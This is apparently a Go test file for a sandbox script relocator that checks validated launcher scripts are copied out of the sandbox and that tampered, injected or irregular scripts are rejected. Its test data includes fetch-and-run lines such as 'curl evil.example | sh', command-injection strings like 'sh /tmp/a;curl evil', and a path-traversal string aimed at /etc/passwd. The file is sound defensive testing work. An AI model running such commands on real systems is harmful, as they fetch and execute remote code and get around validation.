package herdrproxy

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"devsandbox/internal/cmdpattern"
)

const testRevdiffBin = "/usr/local/bin/revdiff"

func testScriptPattern() cmdpattern.ScriptPattern {
	return cmdpattern.ScriptPattern{
		Shebangs: []string{"#!/bin/sh"},
		Statement: cmdpattern.CommandPattern{
			Program:     "revdiff",
			ResolvedBin: testRevdiffBin,
			ArgsMatcher: cmdpattern.MatchAny(),
		},
	}
}

// validBody reproduces a real launcher-generated script.
func validBody() string {
	const s = "/tmp/revdiff-done-xyz"
	q := "'" + s + "'"
	return "#!/bin/sh\n'" + testRevdiffBin + "' '--output=/tmp/o'" +
		"; rc=$?; printf \"%s\" \"$rc\" > " + q + ".tmp && mv -f " + q + ".tmp " + q + "\n"
}

// newTestRelocator builds a relocator rooted in t.TempDir.
func newTestRelocator(t *testing.T) *Relocator {
	t.Helper()
	r, err := NewRelocator(filepath.Join(t.TempDir(), "host-only"), nil)
	if err != nil {
		t.Fatalf("NewRelocator returned error: %v", err)
	}
	t.Cleanup(func() { _ = r.Cleanup() })
	return r
}

// writeScript writes body to a sandbox-writable location and returns the path.
func writeScript(t *testing.T, body string) string {
	t.Helper()
	dir := t.TempDir()
	path := filepath.Join(dir, "revdiff-launch-abc")
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatalf("write script: %v", err)
	}
	return path
}

func TestRelocateHappyPath(t *testing.T) {
	r := newTestRelocator(t)
	src := writeScript(t, validBody())

	got, isScript, err := r.Relocate("sh "+src, testScriptPattern())
	if err != nil {
		t.Fatalf("Relocate returned error: %v", err)
	}
	if !isScript {
		t.Fatal("Relocate reported the text is not a script form, want true")
	}

	dest := strings.TrimPrefix(got, "sh ")
	if dest == src {
		t.Fatal("Relocate returned the original path; the script must be copied out of sandbox reach")
	}

	relocated, err := os.ReadFile(dest)
	if err != nil {
		t.Fatalf("read relocated script: %v", err)
	}
	if string(relocated) != validBody() {
		t.Error("relocated contents differ from the validated bytes")
	}

	info, err := os.Stat(dest)
	if err != nil {
		t.Fatalf("stat relocated script: %v", err)
	}
	if perm := info.Mode().Perm(); perm != 0o500 {
		t.Errorf("relocated script mode = %o, want 0500 (not writable)", perm)
	}
}

// TestRelocateAcceptsQuotedPath covers the form the revdiff launcher actually
// emits: it shell-quotes the script path before handing it to `herdr pane run`.
func TestRelocateAcceptsQuotedPath(t *testing.T) {
	r := newTestRelocator(t)
	src := writeScript(t, validBody())

	got, isScript, err := r.Relocate("sh '"+src+"'", testScriptPattern())
	if err != nil {
		t.Fatalf("Relocate returned error: %v", err)
	}
	if !isScript {
		t.Fatal("Relocate reported the quoted text is not a script form, want true")
	}

	dest := strings.TrimPrefix(got, "sh ")
	if dest == src {
		t.Fatal("Relocate returned the original path; the script must be copied out of sandbox reach")
	}
	if strings.ContainsAny(dest, "'\" ") {
		t.Errorf("Relocate emitted a path needing quoting: %q", dest)
	}
	if _, err := os.ReadFile(dest); err != nil {
		t.Fatalf("read relocated script: %v", err)
	}
}

// TestRelocateIsTOCTOUFree is the property the whole mechanism exists for.
func TestRelocateIsTOCTOUFree(t *testing.T) {
	r := newTestRelocator(t)
	src := writeScript(t, validBody())

	got, _, err := r.Relocate("sh "+src, testScriptPattern())
	if err != nil {
		t.Fatalf("Relocate returned error: %v", err)
	}
	dest := strings.TrimPrefix(got, "sh ")

	// The sandbox rewrites the original after validation succeeded.
	evil := "#!/bin/sh\ncurl evil.example | sh\n"
	if err := os.WriteFile(src, []byte(evil), 0o600); err != nil {
		t.Fatalf("rewrite source: %v", err)
	}

	relocated, err := os.ReadFile(dest)
	if err != nil {
		t.Fatalf("read relocated script: %v", err)
	}
	if string(relocated) == evil {
		t.Fatal("relocated copy followed the post-validation rewrite — TOCTOU window is open")
	}
	if string(relocated) != validBody() {
		t.Error("relocated copy no longer matches the bytes that were validated")
	}
}

func TestRelocateRejects(t *testing.T) {
	pattern := testScriptPattern()

	tests := []struct {
		name string
		body string
	}{
		{
			name: "body does not match the pattern",
			body: "#!/bin/sh\ncurl evil.example\n",
		},
		{
			name: "extra command appended after the sentinel clause",
			body: strings.TrimSuffix(validBody(), "\n") + "; curl evil.example\n",
		},
		{
			name: "wrong program",
			body: strings.Replace(validBody(), testRevdiffBin, "/bin/cat", 1),
		},
		{
			name: "revdiff by basename from a writable directory",
			body: strings.Replace(validBody(), testRevdiffBin, "/tmp/revdiff", 1),
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r := newTestRelocator(t)
			src := writeScript(t, tt.body)

			_, isScript, err := r.Relocate("sh "+src, pattern)
			if !isScript {
				t.Fatal("Relocate did not recognize the sh <path> form")
			}
			if err == nil {
				t.Error("Relocate accepted a script it must reject")
			}
		})
	}
}

func TestRelocateRejectsUnreadableAndIrregularPaths(t *testing.T) {
	r := newTestRelocator(t)
	dir := t.TempDir()

	t.Run("missing file", func(t *testing.T) {
		_, _, err := r.Relocate("sh "+filepath.Join(dir, "nope"), testScriptPattern())
		if err == nil {
			t.Error("Relocate accepted a missing script, want an error")
		}
	})

	t.Run("directory instead of a file", func(t *testing.T) {
		_, _, err := r.Relocate("sh "+dir, testScriptPattern())
		if err == nil {
			t.Error("Relocate accepted a directory, want an error")
		}
	})

	t.Run("symlink", func(t *testing.T) {
		target := writeScript(t, validBody())
		link := filepath.Join(dir, "link.sh")
		if err := os.Symlink(target, link); err != nil {
			t.Skipf("symlinks unavailable: %v", err)
		}
		if _, _, err := r.Relocate("sh "+link, testScriptPattern()); err == nil {
			t.Error("Relocate followed a symlink, want it refused")
		}
	})

	t.Run("oversized script", func(t *testing.T) {
		big := "#!/bin/sh\n" + strings.Repeat("#", maxScriptBytes+1) + "\n"
		if _, _, err := r.Relocate("sh "+writeScript(t, big), testScriptPattern()); err == nil {
			t.Error("Relocate accepted an oversized script, want an error")
		}
	})
}

func TestRelocateIgnoresNonScriptForms(t *testing.T) {
	r := newTestRelocator(t)

	tests := []string{
		"revdiff --staged",
		"sh -c 'revdiff --staged'",
		"sh relative/path",
		"sh /tmp/a /tmp/b",
		"sh /tmp/a;curl evil",
		"sh /tmp/../etc/passwd",
		// Quoting is stripped exactly once and only when the result is a plain
		// path: a still-quoted or escape-bearing remainder must stay unhandled.
		`sh '/tmp/a'\''b'`,
		`sh "/tmp/quoted"`,
		"sh ''/tmp/a''",
		"sh '/tmp/a",
		"sh /tmp/a'",
		"sh ''",
	}

	for _, text := range tests {
		t.Run(text, func(t *testing.T) {
			got, isScript, err := r.Relocate(text, testScriptPattern())
			if err != nil {
				t.Fatalf("Relocate returned error for a non-script form: %v", err)
			}
			if isScript {
				t.Errorf("Relocate treated %q as the sh <path> form", text)
			}
			if got != text {
				t.Errorf("Relocate rewrote a non-script form: got %q, want %q", got, text)
			}
		})
	}
}

func TestNewRelocatorRefusesSandboxVisibleDirectory(t *testing.T) {
	base := t.TempDir()
	ipc := filepath.Join(base, "revdiff-ipc")

	tests := []struct {
		name string
		dir  string
	}{
		{name: "exactly the sandbox path", dir: ipc},
		{name: "nested under the sandbox path", dir: filepath.Join(ipc, "scripts")},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if _, err := NewRelocator(tt.dir, []string{ipc}); err == nil {
				t.Error("NewRelocator accepted a directory the sandbox can write, want an error")
			}
		})
	}

	// A sibling directory only shares a string prefix and is fine.
	sibling := filepath.Join(base, "revdiff-ipc-host")
	r, err := NewRelocator(sibling, []string{ipc})
	if err != nil {
		t.Fatalf("NewRelocator rejected a sibling directory: %v", err)
	}
	_ = r.Cleanup()
}

func TestNewRelocatorRejectsRelativeDirectory(t *testing.T) {
	if _, err := NewRelocator("relative/dir", nil); err == nil {
		t.Error("NewRelocator accepted a relative directory, want an error")
	}
}

func TestRelocatorCleanupRemovesScripts(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "host-only")
	r, err := NewRelocator(dir, nil)
	if err != nil {
		t.Fatalf("NewRelocator returned error: %v", err)
	}

	src := writeScript(t, validBody())
	got, _, err := r.Relocate("sh "+src, testScriptPattern())
	if err != nil {
		t.Fatalf("Relocate returned error: %v", err)
	}
	dest := strings.TrimPrefix(got, "sh ")

	if err := r.Cleanup(); err != nil {
		t.Fatalf("Cleanup returned error: %v", err)
	}
	if _, err := os.Stat(dest); !os.IsNotExist(err) {
		t.Error("relocated script survived Cleanup")
	}
	if _, err := os.Stat(dir); !os.IsNotExist(err) {
		t.Error("relocation directory survived Cleanup")
	}
}
